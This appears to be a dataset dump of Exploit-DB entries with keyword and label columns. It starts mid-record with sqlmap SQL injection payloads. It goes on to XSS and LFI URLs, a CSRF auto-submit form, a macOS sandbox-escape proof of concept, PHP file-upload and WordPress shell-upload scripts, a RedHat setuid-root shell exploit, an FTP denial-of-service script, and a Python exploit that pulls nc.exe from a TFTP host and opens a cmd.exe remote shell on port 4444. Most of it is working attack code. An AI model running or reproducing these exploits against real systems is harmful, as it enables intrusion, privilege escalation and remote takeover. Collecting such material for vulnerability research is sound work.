Parameter: params[0][value] (POST)     Type: boolean-based blind     Title: AND boolean-based blind - WHERE or HAVING clause     Payload: page=2&on_home=5&table_name=be&params[0][type]=text&params[0][value]=%' AND 1906=1906 AND '%'='&params[0][name]=Name&params[1][type]=text&params[1][value]=&params[1][name]=Surname&params[2][type]=num_range&params[2][value][]=&params[2][value][]=&params[2][name]=Age&params[3][type]=date&params[3][value]=&params[3][name]=Born_date&ordering=none      Type: AND/OR time-based blind     Title: MySQL >= 5.0.12 AND time-based blind     Payload: page=2&on_home=5&table_name=be&params[0][type]=text&params[0][value]=%' AND SLEEP(5) AND '%'='&params[0][name]=Name&params[1][type]=text&params[1][value]=&params[1][name]=Surname&params[2][type]=num_range&params[2][value][]=&params[2][value][]=&params[2][name]=Age&params[3][type]=date&params[3][value]=&params[3][name]=Born_date&ordering=none  Parameter: params[0][name] (POST)     Type: AND/OR time-based blind     Title: MySQL >= 5.0.12 AND time-based blind     Payload: page=2&on_home=5&table_name=be&params[0][type]=text&params[0][value]=&params[0][name]=Name) AND SLEEP(5) AND (2977=2977&params[1][type]=text&params[1][value]=&params[1][name]=Surname&params[2][type]=num_range&params[2][value][]=&params[2][value][]=&params[2][name]=Age&params[3][type]=date&params[3][value]=&params[3][name]=Born_date&ordering=none  ====================================================",Grid,1
29064,"Xtreme ASP Photo Gallery 2.0 - 'displaypic.asp?catname' Cross-Site Scripting source: https://www.securityfocus.com/bid/21138/info   Xtreme ASP Photo Gallery is prone to multiple input-validation vulnerabilities, including cross-site scripting and SQL-injection issues and an HTML-injection issue because the application fails to properly sanitize user-supplied input.    Successful exploits of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.   http://target/path/displaypic.asp?category=23&sortorder=9&total=10&catname=[XSS]",Xtreme,1
46298,"macOS < 10.14.3 / iOS < 12.1.3 - Sandbox Escapes due to Type Confusions and Memory Safety Issues in iohideventsystem /* It's possible that this should be two separate issues but I'm filing it as one as I'm still understanding this service.  com.apple.iohideventsystem is hosted in hidd on MacOS and backboardd on iOS. You can talk to it from the app sandbox on iOS.  It uses an IOMIGMachPortCache to translate between ports on which messages were received and CF objects on which actions should be performed. There is insufficient checking that the types are correct; so far as I can tell all the io_hideventsystem_* methods apart from io_hideventsystem_open expect to be called on a ""connection"" port, but that's not enforced. Specifically, the service port is put in the cache mapped to an IOHIDEventServer object, and each connection is put in mapped to IOHIDEventSystemConnection objects. Note that the service IOMIG port can demux the whole hideventsystem service (all the methods.) This seems to lead to a lot of type confusion issues (eg places where the code is trying to read a bitmap of entitlements possessed by the connection but is in fact reading out of bounds.)  There's also what looks like a regular memory safety issue in _io_hideventsystem_unregister_record_service_changed_notification.  This converts the port its called on to an object via IOMIGMachPortCacheCopy then passes that to _IOHIDEventSystemConnectionUnregisterRecordServiceChanged.  This reads an object pointer from +0x10, which for both an IOHIDEventServer and IOHIDEventSystemConnection is an IOHIDEventSystem,  passes that to _IOHIDEventSystemUnregisterRecordServiceChanged and then calls CFRelease on it.  The problem is that this CFRelease call isn't balanced by a CFRetain, so each call to this just lets us arbitrarily drop references on that object...  The PoC for this issue is trivial, just connect to the service and call io_hideventsystem_unregister_record_service_changed_notification twice.  You should enable guard malloc for the service to more easily see what's going on.  Tested on MacOS 10.14.1 (18B75)   // ianbeer // build: clang -o hidcrasher hidcrasher.c -framework IOKit // repro: enable guard malloc for hidd: sudo launchctl debug system/com.apple.hidd --guard-malloc //        then either manually kill hidd or run the PoC twice so that the second time you can more clearly observe the UaF  #if 0 iOS/MacOS Sandbox escapes due to type confusions and memory safety issues in iohideventsystem  It's possible that this should be two separate issues but I'm filing it as one as I'm still understanding this service.  com.apple.iohideventsystem is hosted in hidd on MacOS and backboardd on iOS. You can talk to it from the app sandbox on iOS.  It uses an IOMIGMachPortCache to translate between ports on which messages were received and CF objects on which actions should be performed. There is insufficient checking that the types are correct; so far as I can tell all the io_hideventsystem_* methods apart from io_hideventsystem_open expect to be called on a ""connection"" port, but that's not enforced. Specifically, the service port is put in the cache mapped to an IOHIDEventServer object, and each connection is put in mapped to IOHIDEventSystemConnection objects. Note that the service IOMIG port can demux the whole hideventsystem service (all the methods.) This seems to lead to a lot of type confusion issues (eg places where the code is trying to read a bitmap of entitlements possessed by the connection but is in fact reading out of bounds.)  There's also what looks like a regular memory safety issue in _io_hideventsystem_unregister_record_service_changed_notification.  This converts the port its called on to an object via IOMIGMachPortCacheCopy then passes that to _IOHIDEventSystemConnectionUnregisterRecordServiceChanged.  This reads an object pointer from +0x10, which for both an IOHIDEventServer and IOHIDEventSystemConnection is an IOHIDEventSystem,  passes that to _IOHIDEventSystemUnregisterRecordServiceChanged and then calls CFRelease on it.  The problem is that this CFRelease call isn't balanced by a CFRetain, so each call to this just lets us arbitrarily drop references on that object...  The PoC for this issue is trivial, just connect to the service and call io_hideventsystem_unregister_record_service_changed_notification twice.  You should enable guard malloc for the service to more easily see what's going on.  Tested on MacOS 10.14.1 (18B75) #endif  #include <stdio.h> #include <stdlib.h> #include <unistd.h>  #include <mach/mach.h> #include <mach/mach_vm.h> #include <servers/bootstrap.h>  kern_return_t io_hideventsystem_unregister_record_service_changed_notification(   mach_port_t service_connection);  int main(int argc, char** argv) {   kern_return_t err;      // connect to the com.apple.iohideventsystem service    mach_port_t service_port = MACH_PORT_NULL;    err = bootstrap_look_up(bootstrap_port, ""com.apple.iohideventsystem"", &service_port);   if (err != KERN_SUCCESS || service_port == MACH_PORT_NULL) {     printf(""failed to lookup service\n"");     exit(EXIT_FAILURE);   }    printf(""got service port: 0x%x\n"", service_port);      for (int i = 0; i < 10; i++) {     io_hideventsystem_unregister_record_service_changed_notification(service_port);   }   return 0; } */  / ianbeer // build: clang -o hid_typeconfusion hid_typeconfusion.c -framework IOKit -framework CoreFoundation // repro: enable guard malloc for hidd: sudo launchctl debug system/com.apple.hidd --guard-malloc //        then kill hidd so it restarts with guard malloc enabled  #include <stdio.h> #include <stdlib.h> #include <unistd.h>  #include <mach/mach.h> #include <mach/mach_vm.h> #include <servers/bootstrap.h>  #include <CoreFoundation/CoreFoundation.h>  kern_return_t io_hideventsystem_create_virtual_service(   mach_port_t connection,   void* desc,   uint32_t desc_len,   uint64_t* id_out);  extern uint32_t _IOHIDSerialize(CFTypeRef obj, mach_vm_address_t* out);  int main(int argc, char** argv) {   kern_return_t err;      /* connect to the com.apple.iohideventsystem service */    mach_port_t service_port = MACH_PORT_NULL;    err = bootstrap_look_up(bootstrap_port, ""com.apple.iohideventsystem"", &service_port);   if (err != KERN_SUCCESS || service_port == MACH_PORT_NULL) {     printf(""failed to lookup service\n"");     exit(EXIT_FAILURE);   }    printf(""got service port: 0x%x\n"", service_port);      /* need a dictionary */   CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);   CFDictionaryAddValue(dict, CFSTR(""key""), CFSTR(""value""));    mach_vm_address_t out_ptr = 0;   uint32_t size = _IOHIDSerialize(dict, &out_ptr);    CFRelease(dict);    uint64_t id_out = 0;   err = io_hideventsystem_create_virtual_service(service_port, (void*)out_ptr, size, &id_out);      return 0; }",iohideventsystem,0
33419,F3Site 2009 - '/mod/poll.php?GLOBALS[nlang]' Traversal Local File Inclusion source: https://www.securityfocus.com/bid/37408/info  F3Site is prone to multiple local file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  F3Site 2009 is vulnerable; other versions may also be affected.   http://www.example.com/mod/poll.php?GLOBALS[nlang]=[LFI%00],F3Site,1
17251,"VCalendar 1.1.5 - Cross-Site Request Forgery Vulnerability ID: HTB22969 Reference: http://www.htbridge.ch/advisory/csrf_cross_site_request_forgery_in_vcalendar.html Product: VCalendar Vendor: UltraApps ( http://ultraapps.com )  Vulnerable Version: 1.1.5 Vendor Notification: 21 April 2011  Vulnerability Type: CSRF (Cross-Site Request Forgery) Risk level: Low  Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ )   Vulnerability Details: The vulnerability exists due to failure in the ""/admin/users_maint.php"" script to properly verify the source of HTTP request. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data. Attacker can use browser to exploit this vulnerability. The following PoC is available:   <form action=""http://[host]/admin/users_maint.php?ccsForm=users_maint"" method=""post"" name=""main"" /> <input type=""hidden"" name=""user_login"" value=""test""/> <input type=""hidden"" name=""user_password"" value=""test""/> <input type=""hidden"" name=""user_level"" value=""100""/> <input type=""hidden"" name=""user_email"" value=""test@test.com""/> <input type=""hidden"" name=""user_first_name"" value=""test""/> <input type=""hidden"" name=""user_last_name"" value=""test""/> <input type=""hidden"" name=""user_is_approved"" value=""1""/> <input type=""hidden"" name=""user_date_add_h"" value=""04.16.2011""/> <input type=""submit"" id=""btn"" name=""submit"" value=""Submit â€ºâ€º""> </form> <script> document.getElementById('btn').click(); </script>",claws-mail,1
29763,"W-Agora 4.2.1 - Multiple Arbitrary File Upload Vulnerabilities source: https://www.securityfocus.com/bid/23055/info  w-Agora is prone to multiple arbitrary file-upload vulnerabilities.  An attacker can exploit these vulnerabilities to upload PHP script code and execute it in the context of the webserver process.  w-Agora 4.2.1 is vulnerable.   <?php /* Title .......................: w-Agora Forum 4.2.1 Remote File Upload Exploit Site ........................: http://www.w-agora.com/en/download.php Version .....................:  4.2.1     Author ......................: Treasure Priyamal Site ........................: http://treasuresec.com E-mail ......................: treasure[at]treasuresec.com   Discription =========== w-Agora avatar upload option has content file detect option , but it can be replace with simply editing POST Request from your browser   Here is a dump from Temp-Data I editied while im upload the File. Just simply replacing the Content-Type you will be able to upload your script     6:28:18.073[118ms][total 3862ms] Status: 200[OK] POST http://localhost/w-agora/browse_avatar.php Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Content Size[-1] Mime Type[text/html]    Request Headers:       Host[localhost]       User-Agent[Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1]       Accept[text/html,application/xhtml+xml,application/xml;q=0.9,/*;q=0.8]       Accept-Language[en-us,en;q=0.5]       Accept-Encoding[gzip, deflate]       Accept-Charset[ISO-8859-1,utf-8;q=0.7,*;q=0.7]       Keep-Alive[115]       Connection[keep-alive]       Referer[http://localhost/w-agora/browse_avatar.php?site=localhost]       Cookie[wa_lang=en; WAS_localhost_test=LastVisit%3D1306715684%26ThisVisit%3D1306715918%26visited%3D1306672722%2B; WAP_localhost_test=Visits%3D1%26LastVisit%3D1306715684; localhost_test_sort=newest; WAP_localhost_auth=lastVisit%3D1306715682%26uid%3Dtest%26pw%3D098f6bcd4621d373cade4e832627b4f6; localhost_auth=lastVisit%3D1306715998%26uid%3Dtest%26pw%3D098f6bcd4621d373cade4e832627b4f6]    Post Data:       POST_DATA[-----------------------------76401208715012 Content-Disposition: form-data; name=""site""   localhost -----------------------------76401208715012 Content-Disposition: form-data; name=""submitted""   true -----------------------------76401208715012 Content-Disposition: form-data; name=""perpage""   20 -----------------------------76401208715012 Content-Disposition: form-data; name=""first""   0 -----------------------------76401208715012 Content-Disposition: form-data; name=""avatar""; filename=""echo.php"" Content-Type: image/jpeg\   <?php phpinfo(); ?>   -----------------------------76401208715012 Content-Disposition: form-data; name=""submit""   Copy file -----------------------------76401208715012-- ]    Response Headers:       Date[Mon, 30 May 2011 00:58:18 GMT]       Server[Apache/2.2.11 (Win32) PHP/5.3.0]       X-Powered-By[PHP/5.3.0]       Keep-Alive[timeout=5, max=100]       Connection[Keep-Alive]       Transfer-Encoding[chunked]       Content-Type[text/html]         */   if(count($argv) == 5) {     echo ""\n\n"";     echo ""+---------------------------------------------------------------+\r\n"";     echo ""|        w-Agora Forum 4.2.1 Remote File Upload Exploit          |\r\n"";     echo ""|                   Treasure Security                            |\r\n"";     echo ""|                 by Treasure Priyamal                           |\r\n"";     echo ""|        Usage: php exploit.php site.com /path/ user pass        |\r\n"";     echo ""+---------------------------------------------------------------+\r\n"";     echo ""\n"";                echo ""Code to write in the file (ie. <?php phpinfo(); ?>) :\r\n\n"";     $code     =   trim(fgets(STDIN));            $socket   =   @fsockopen($argv[1], 80, $eno, $estr, 30);     if(!$socket)     {         die(""Could not connect to "".$argv[1]."". Operation aborted."");     }            $part1      =   ""POST http://192.168.1.101/w-agora/browse_avatar.php?site=localhost HTTP/1.1\r\n"";     $part1     .=   ""Host: "" . $argv[1] . ""\r\n"";     $part1     .=   ""User-Agent : Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1\r\n"";     $part1     .=   ""Accept : text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"";     $part1     .=   ""Connection: keep-alive\r\n"";     $part1     .=   ""Accept-Language : en-us,en;q=0.5\r\n"";     $part1     .=   ""Referer :localhost/w-agora/browse_avatar.php?site=localhost\r\n"";     $part1     .=   ""Cookie : wa_lang=en\r\n"";         $part1     .=   ""Content-Type : multipart/form-data; boundary=---------------------------14695017222113685839218008876\r\n"";     $part2      =   ""-----------------------------14695017222113685839218008876\r\n"";     $part2     .=   ""Content-Disposition: form-data; name=\""site\""\r\n"";     $part2     .=   ""localhost\r\n"";     $part2     .=   ""-----------------------------14695017222113685839218008876\r\n"";     $part2     .=   ""Content-Disposition: form-data; name=\""submitted\""\r\n"";     $part2     .=   ""true\r\n"";     $part2     .=   ""-----------------------------14695017222113685839218008876\r\n"";     $part2     .=   ""Content-Disposition: form-data; name=\""perpage\""\r\n"";     $part2     .=   ""20\r\n"";     $part2     .=   ""-----------------------------14695017222113685839218008876\r\n"";     $part2     .=   ""Content-Disposition: form-data; name=\""first\""\r\n"";     $part2     .=   ""0\r\n"";     $part2     .=   ""-----------------------------14695017222113685839218008876\r\n"";     $part2     .=   ""Content-Disposition: form-data; name=\""avatar\""; filename=\""file.php\""\r\n"";     $part2     .=   ""Content-Type: image/gif\r\n"";  // this is where the magic happens     $part2     .=   $code.""\r\n"";     $part2     .=   ""-----------------------------14695017222113685839218008876\r\n"";     $part2     .=   ""Content-Disposition: form-data; name=\""Submit\""\r\n"";     $part2     .=   ""Copy file\r\n"";     $part2     .=   ""-----------------------------14695017222113685839218008876\r\n"";            $part1     .=   ""Content-Length: "" . strlen($part2) . ""\r\n\r\n"";     $part1     .=   $part2;         fwrite($socket, $part1);          echo ""check the upload folder"";        } else {     echo ""\n\n"";     echo ""+---------------------------------------------------------------+\r\n"";     echo ""|        w-Agora Forum 4.2.1 Remote File Upload Exploit         |\r\n"";     echo ""|                   Treasure Security                            |\r\n"";     echo ""|        by Treasure Priyamal                                    |\r\n"";     echo ""+---------------------------------------------------------------+\r\n"";     echo ""|        Usage: php exploit.php site.com /path/ user pass       |\r\n"";     echo ""+---------------------------------------------------------------+\r\n"";     echo ""\n\n""; } ?>",.w-agora.,1
40632,"SmallFTPd 1.0.3 - 'mkd' Denial of Service from ftplib import FTP  print '''                 ##############################################                 #    Created: ScrR1pTK1dd13                  #                 #    Name: Greg Priest                       #                 #    Mail: ScrR1pTK1dd13.slammer@gmail.com   #                  ##############################################   # Exploit Title: smallftp_mkd_command_DoS_Exploit # Date: 2016.10.26 # Exploit Author: Greg Priest # Version: smallftpd 1.0.3 # Tested on: Windows XP, Windows 7 x64  '''  ftp_ip = raw_input(""FTP server IP:"") user = raw_input(""username:"") password = raw_input(""password:"") killercode = 'CRASH' * 100 ftp = FTP(ftp_ip) ftp.login(user, password) print ftp.login print ""CRSAH CODE SENT!"" FTP.mkd(ftp, killercode)",SmallFTPd,1
18993,"WordPress Plugin Asset Manager 0.2 - Arbitrary File Upload ################################################## # Description : Wordpress Plugins - Asset Manager Shell Upload Vulnerability # Version : 0.2 # Link : http://wordpress.org/extend/plugins/asset-manager/ # Plugins : http://downloads.wordpress.org/plugin/asset-manager.0.2.zip # Date : 26-05-2012 # Google Dork : inurl:/wp-content/plugins/asset-manager/ # Author : Sammy FORGIT - sam at opensyscom dot fr -  http://www.opensyscom.fr ##################################################   Exploit :  PostShell.php <?php  $uploadfile=""lo.php""; $ch =  curl_init(""http://www.exemple.com/wordpress/wp-content/plugins/asset-manager/upload.php""); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS,          array('Filedata'=>""@$uploadfile"")); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $postResult = curl_exec($ch); curl_close($ch); print ""$postResult"";  ?>  Shell Access : http://www.exemple.com/wordpress/wp-content/uploads/assets/temp/lo.php  lo.php <?php phpinfo(); ?>",Wordpress,1
182,"RedHat 6.2 - '/sbin/restore' Local Privilege Escalation #!/bin/sh # # /sbin/restore exploit for rh6.2 # # I did not find this weakness my self, all i did was # writing this script (and some more) to make it  # automatic and easy to use. # # This exploit should work on all redhat 6.2 systems # with /sbin/restore not ""fucked up"". May work on other # distros too, but only tested successfully on rh6.2. # # Make sure that the $USER variable is set! If you aren't # sure, do a SET USER=<your-login-name> before you start # the exploit! # # Please do NOT remove this header from the file. #  echo ""###########################################"" echo ""#     /sbin/restore exploit for rh6.2     #"" echo ""#          this file by nawok '00         #"" echo ""###########################################"" echo "" "" echo ""==> EXPLOIT STARTED, Wait..."" echo ""#!/bin/sh"" >> /home/$USER/execfile echo ""cp /bin/sh /home/$USER/sh"" >> /home/$USER/execfile echo ""chmod 4755 /home/$USER/sh"" >> /home/$USER/execfile chmod 755 /home/$USER/execfile export TAPE=restorer:restorer export RSH=/home/$USER/execfile touch /tmp/1 /sbin/restore -t /tmp/1 rm -f /home/$USER/execfile echo ""==> DONE! If everything went OK we will now enter rootshell..."" echo ""==> To check if its rooted, type 'whoami', or 'id'""  echo ""==> B-Bye, you are on your own now."" /home/$USER/sh   # milw0rm.com [2000-11-16]",RedHat,1
24238,"CuteNews 0.88/1.3 - 'example1.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/10620/info  It is reported that CuteNews is affected by multiple cross-site scripting vulnerabilities. These issues are due to a failure of the application to properly sanitize user-supplied URI input.  The problems present themselves when malicious HTML and script code is sent to the application through the 'id' parameter of the multiple scripts.  These issues could permit a remote attacker to create a malicious URI link that includes hostile HTML and script code. If this link were followed, the hostile code may be rendered in the web browser of the victim user.   http://www.example.com/example1.php?subaction=showfull&id=<script>alert(document.cookie);</script>",cutephp,1
31971,PHP Ticket System Beta 1 - 'get_all_created_by_user.php?id' SQL Injection # ============================================================== # Title ...| PHP Ticket System SQL Injection # Version .| BETA_1.zip # Date ....| 27.02.2014 # Found ...| HauntIT Blog # Home ....| http://sourceforge.net/projects/phpticketsystem/ # ==============================================================    # ============================================================== # SQL Injection  ---<request>--- GET /k/cms/beta/mods/tickets/data/get_all_created_by_user.php?id='mynameissqli&sort%5B0%5D%5Bfield%5D=undefined&sort%5B0%5D%5Bdir%5D=desc HTTP/1.1 Host: 10.149.14.62 ---<request>---   # ============================================================== # More @ http://HauntIT.blogspot.com # Thanks! ;) # o/,shawn_bradley,1
48310,"Huawei HG630 2 Router - Authentication Bypass # Title: Huawei HG630 2 Router - Authentication Bypass # Date: 2020-04-13 # Author: Eslam Medhat # Vendor Homepage: www.huawei.com # Version: HG630 V2 # HardwareVersion: VER.B # CVE: N/A  #POC:  The default password of this router is the last 8 characters of the device's serial number which exist in the back of the device.  An attacker can leak the serial number via the web app API like the following:  ************************Request************************ GET /api/system/deviceinfo HTTP/1.1 Host: 192.168.1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://192.168.1.1/ X-Requested-With: XMLHttpRequest Connection: close Cookie: SessionID_R3=0PVHKCwY01etBMntI9TZZRvYX04emsjws0Be4EQ8VcoojhWaRQpOV9E0BbAktJDwzI0au6s1xgl0Cn7bvN9rejjMhJCI1t07f2XDnbo09tjN4mcG0XMyXbMoJLjViHm   ************************Response************************ HTTP/1.1 200 OK Cache-Control: no-cache, no-store, max-age=0, must-revalidate X-Download-Options: noopen X-Frame-Options: SAMEORIGIN X-XSS-Protection: 1; mode=block Date: Fri, 01 Jan 2010 09:14:47 GMT Connection: Keep-Alive Content-Language: en Content-Type: application/javascript Content-Length: 141  while(1); /*{""DeviceName"":""HG630 V2"",""SerialNumber"":""T5D7S18815905395"",""ManufacturerOUI"":""00E0FC"",""UpTime"":33288,""HardwareVersion"":""VER.B""}*/   You can use that serial number to login to the router.  #Reference: https://www.youtube.com/watch?v=vOrIL7L_cVc",.huawei.,1
47386,"LimeSurvey 3.17.13 - Cross-Site Scripting SEC Consult Vulnerability Lab Security Advisory < 20190912-0 > =======================================================================               title: Stored and reflected XSS vulnerabilities             product: LimeSurvey  vulnerable version: <= 3.17.13       fixed version: =>3.17.14          CVE number: CVE-2019-16172, CVE-2019-16173              impact: medium            homepage: https://www.limesurvey.org/               found: 2019-08-23                  by: Andreas Kolbeck (Office Munich)                      David Haintz (Office Vienna)                      SEC Consult Vulnerability Lab                       An integrated part of SEC Consult                      Europe | Asia | North America                       https://www.sec-consult.com  =======================================================================  Vendor description: ------------------- ""LimeSurvey is the tool to use for your online surveys. Whether you are conducting simple questionnaires with just a couple of questions or advanced assessments with conditionals and quota management, LimeSurvey has got you covered. LimeSurvey is 100% open source and will always be transparently developed. We can help you reach your goals.""  Source: https://www.limesurvey.org/   Business recommendation: ------------------------ LimeSurvey suffered from a vulnerability due to improper input and output validation. By exploiting this vulnerability an attacker could:     1. Attack other users of the web application with JavaScript code,        browser exploits or Trojan horses, or     2. perform unauthorized actions in the name of another logged-in user.  The vendor provides a patch which should be installed immediately. Furthermore, a thorough security analysis is highly recommended as only a short spot check has been performed and additional issues are to be expected.   Vulnerability overview/description: ----------------------------------- 1) Stored and reflected XSS vulnerabilities LimeSurvey suffers from a stored and reflected cross-site scripting vulnerability, which allows an attacker to execute JavaScript code with the permissions of the victim. In this way it is possible to escalate privileges from a low-privileged account e.g. to ""SuperAdmin"".   Proof of concept: ----------------- 1) Stored and reflected XSS vulnerabilities Example 1 - Stored XSS (CVE-2019-16172): The attacker needs the appropriate permissions in order to create new survey groups. Then create a survey group with a JavaScript payload in the title, for example:  test<svg/onload=alert(document.cookie)>  When the survey group is being deleted, e.g. by an administrative user, the JavaScript code will be executed as part of the ""success"" message.   Example 2 - Reflected XSS (CVE-2019-16173): The following proof of concept prints the current CSRF token cookie which contains the CSRF token. The parameter ""surveyid"" is not filtered properly:  http://$host/index.php/admin/survey?mandatory=1&sid=xxx&surveyid=xxx%22%3E%3Cimg%20 src=x%20onerror=%22alert(document.cookie)%22%3E&sa=listquestions&sort=question   If the URL schema is configured differently the following payload works: http://$host/index.php?r=admin/survey&mandatory=1&sid=xxx&surveyid= xxx""><img%20src=x%20onerror=""alert(document.cookie)"">&sa=listquestions&sort=question   Vulnerable / tested versions: ----------------------------- The vulnerabilities have been verified to exist in version 3.17.9 and the latest version 3.17.13. It is assumed that older versions are affected as well.   Vendor contact timeline: ------------------------ 2019-08-29: Contacting vendor through https://bugs.limesurvey.org/view.php?id=15204 2019-09-02: Fixes available:             https://github.com/LimeSurvey/LimeSurvey/commit/32d6a5224327b246ee3a2a08500544e4f80f9a9a             https://github.com/LimeSurvey/LimeSurvey/commit/f1c1ad2d24eb262363511fcca2e96ce737064006 2019-09-02: Release of LimeSurvey v3.17.14 which fixes the security issues 2019-09-03: Release of LimeSurvey v3.17.15 bug fix 2019-09-12: Coordinated release of security advisory   Solution: --------- Update to version 3.17.15 or higher: https://www.limesurvey.org/stable-release  The vendor provides a detailed list of changes here: https://www.limesurvey.org/limesurvey-updates/2188-limesurvey-3-17-14-build-190902-released   Workaround: ----------- No workaround available.   Advisory URL: ------------- https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  SEC Consult Vulnerability Lab  SEC Consult Europe | Asia | North America  About SEC Consult Vulnerability Lab The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It ensures the continued knowledge gain of SEC Consult in the field of network and application security to stay ahead of the attacker. The SEC Consult Vulnerability Lab supports high-quality penetration testing and the evaluation of new offensive and defensive technologies for our customers. Hence our customers obtain the most current information about vulnerabilities and valid recommendation about the risk profile of new technologies.  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Interested to work with the experts of SEC Consult? Send us your application https://www.sec-consult.com/en/career/index.html  Interested in improving your cyber security with the experts of SEC Consult? Contact our local offices https://www.sec-consult.com/en/contact/index.html ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Mail: research at sec-consult dot com Web: https://www.sec-consult.com Blog: http://blog.sec-consult.com Twitter: https://twitter.com/sec_consult  EOF A. Kolbeck / @2019",limesurvey,1
3954,"Rational Software Hidden Administrator 1.7 - Authentication Bypass #################################################################################### #           Hidden Administrator Authenticaiton Bypass Exploit                     # #                   ahmed[at]rewterz.com                                           # #            https://www.securityfocus.com/bid/24049                                # #                                                                                  # # C:\>python rewt-ha-exp.py                                                        # # Usage: rewt-ha-exp.py -h <host ip> -p <port> -t <tftpd server ip>                # # make sure nc.exe exists on tftpd server                                          # #                                                                                  # # C:\>telnet 192.168.1.4 4444                                                      # # C:\>python rewt-ha-exp.py -h 192.168.1.4 -p 3128 -t 192.168.1.105                # # [+] Connecting to 192.168.1.4                                                    # # [+] Uploading Files                                                              # # [+] DONE [+]                                                                     # # [+] Now Connect to port 4444 on victim IP !!!                                    # #                                                                                  # # C:\>telnet 192.168.1.4 4444                                                      # # Microsoft Windows XP [Version 5.1.2600]                                          # # (C) Copyright 1985-2001 Microsoft Corp.                                          # # C:\ha_server>                                                                    #  ####################################################################################   import socket import struct import time import sys import getopt   def usage(): 	print ""\n"" 	print ""######################################################"" 	print ""# Hidden Administrator Authentication Bypass Exploit #"" 	print ""#           Coded By ahmed[at]rewterz.com            #"" 	print ""######################################################"" 	print ""\n"" 	print ""Usage: %s -h <host ip> -p <port> -t <tftpd server ip>"" % sys.argv[0] 	print ""make sure nc.exe exists on tftpd server\n""  def exploit(): 	h =""%X"" % (130+len(tftpd))         buff1='_file_manager_operations_copy_files_Loc_Rem_c:\\^file\r\n\x0brewt_ha.bat' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' 	buff1 += ('\\x' + h).decode('string_escape') 	buff1 += '\x00\x00\x00\x00\x00\x00\x00' 	buff1+='\x00tftp -i ' + tftpd + ' GET nc.exe c:\\nc.exe                           ' 	buff1+='\r\nc:\\nc.exe -L -d -p 4444 -e cmd.exe                 \r\n\r\n         ' 	buff1+='      \r\n\r\n_file_manager_operations_get_cur_dir_c:\r\n' 	try: 		print ""[+] Connecting to %s"" %host 	        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 		connect=s.connect((host,int(port))) 		print ""[+] Uploading Files"" 		s.send(buff1) 	        time.sleep(2) 	        s.send('+run_C:\\rewt_ha.bat|\r\n') 	        time.sleep(1) 	        print ""[+] DONE [+]""                 print ""[+] Now Connect to port 4444 on victim IP !!!"" 	except: 		print ""[+] Could not connect to the server""   if len(sys.argv)<7:        usage()        sys.exit() try:        options = getopt.getopt(sys.argv[1:], 'h:p:t:')[0] except getopt.GetoptError, err:        print err        usage()        sys.exit()   for option, value in options:        if option == '-h':            host = value        if option == '-p':            port = int(value)        if option == '-t':            tftpd=value exploit()  # milw0rm.com [2007-05-19]",Rational,1
